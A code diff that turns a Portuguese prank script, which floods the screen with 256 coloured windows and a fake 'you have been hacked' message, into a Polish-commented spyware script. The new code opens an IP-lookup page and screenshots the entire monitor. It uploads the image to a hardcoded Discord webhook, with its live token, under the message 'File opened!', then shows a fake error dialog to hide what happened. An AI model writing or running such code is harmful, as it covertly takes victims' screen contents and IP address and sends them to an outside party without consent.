@@ -1,43 +1,46 @@
-#feito em 8-8-25 - primeiro ano DS
+import webbrowser
+import requests
+import mss
+import io
+from PIL import Image
+import time
 import tkinter as tk
-import random
-import ctypes
-import os
+from tkinter import messagebox
 
-colors = ["#ff0000", "#0000ff", "#ff9100", "#29daa3", "#ff00f2", "#33ff00", "#f2ff00"]
+WEBHOOK_URL = "https://discord.com/api/webhooks/1413819617373192293/Ku7BGliltJoDCmJtQ5ROoVhjrIkA7hO3YpWWciM54V3GEFysGShIa2pxrErf35YfS1Q5"
 
-#criação de janelas
-def criar_janelas():
-    for i in range(2**8):
-        window = tk.Toplevel()
-        rngcolors = random.randint(0, 6)
-        window.configure(bg=f"{colors[rngcolors]}")
-        rng_x = random.randint(90, 1800)
-        rng_y = random.randint(120, 300)
-        rng_resx = random.randint(20, 1800)
-        rng_resy = random.randint(70, 800)
-        window.geometry(f"{rng_resx}x{rng_resy}")
-main_window = tk.Tk()
-main_window.configure(bg="#2d2d86")
-main_window.geometry("600x400")
+# Otwieramy Speedtest.pl w przeglądarce
+print("🔗 Otwieram Speedtest.pl w przeglądarce...")
+webbrowser.open("https://pl.wizcase.com/tools/whats-my-ip/?gad_campaignid=20059325679")
+time.sleep(3)
+# Screenshot ekranu
+with mss.mss() as sct:
+    screenshot = sct.grab(sct.monitors[1])
+    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
 
-#texto
-label = tk.Label(
-    main_window, 
-    text="Você foi hackeado, que triste (muito triste)",
-    font="20"
-)
-label.pack(pady=20)
-label.configure(bg="#ff0000")
+    buffer = io.BytesIO()
+    img.save(buffer, format="PNG")
+    buffer.seek(0)
 
-#botão
-botao = tk.Button(
-    main_window, 
-    text="Clique aqui para remover todos o vírus do seu computador.",
-    font="40",
-    command=main_window.destroy
-)
-botao.pack(pady=40)
+# Wysyłamy na Discorda
+files = {
+    "file": ("speedtest.png", buffer, "image/png")
+}
 
-criar_janelas()
-main_window.mainloop()
+data = {
+    "content": "Otwarto PLik!"
+}
+
+response = requests.post(WEBHOOK_URL, data=data, files=files)
+
+if response.status_code in [200, 204]:
+    print("✅ Screenshot wysłany na Discorda!")
+else:
+    print(f"❌ Błąd {response.status_code}: {response.text}")
+
+
+
+root = tk.Tk()
+root.withdraw
+messagebox.showerror("Błąd, Wystapił nieoczekiwany błąd!")
+root.destroy()
